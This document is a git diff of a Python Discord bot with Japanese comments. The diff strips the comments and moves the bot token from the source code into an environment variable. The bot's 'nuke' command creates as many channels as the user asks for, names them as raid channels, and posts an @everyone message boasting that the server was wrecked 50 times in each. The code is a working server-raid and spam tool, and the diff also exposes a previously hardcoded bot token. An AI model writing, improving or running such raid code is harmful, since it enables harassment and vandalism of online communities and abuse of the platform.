@@ -1,7 +1,7 @@
+import os
 import discord
 from discord.ext import commands
 
-# Intentsの設定
 intents = discord.Intents.default()
 intents.guilds = True
 intents.messages = True
@@ -15,7 +15,6 @@ async def on_ready():
 
 @bot.command(name="nuke")
 async def nuke(ctx):
-    # チャンネルを作成する数をユーザーに質問する
     await ctx.send("作成するチャンネルの数を入力してください（数字のみ）：")
 
     def check(m):
@@ -30,17 +29,13 @@ async def nuke(ctx):
 
     await ctx.send(f"{channel_count}個のチャンネルを作成し、メッセージを送信します...")
 
-    # 指定された数だけチャンネルを作成し、メッセージを連投する
     for i in range(channel_count):
         try:
-            # チャンネルを作成
             channel = await ctx.guild.create_text_channel(f"荒らし-{i+1}")
-            
-            # 1チャンネルにつき50回メッセージを送信
             for _ in range(50):
                 await channel.send("@everyone\n# このサーバーはとまっちによって荒らされましたwww")
         except Exception as e:
             print(f"エラーが発生しました: {e}")
 
-# ボットのトークンを入れてください
-bot.run("MTU1ODAxMDYwMjczNDIzMTU1Mw.G5vDPs.d3Ylo7okeRDYX3PNpS2R000AwaWGXf_PRjIpMc")
+# RailwayのVariables（環境変数）からトークンを安全に読み込む
+bot.run(os.getenv("DISCORD_TOKEN"))
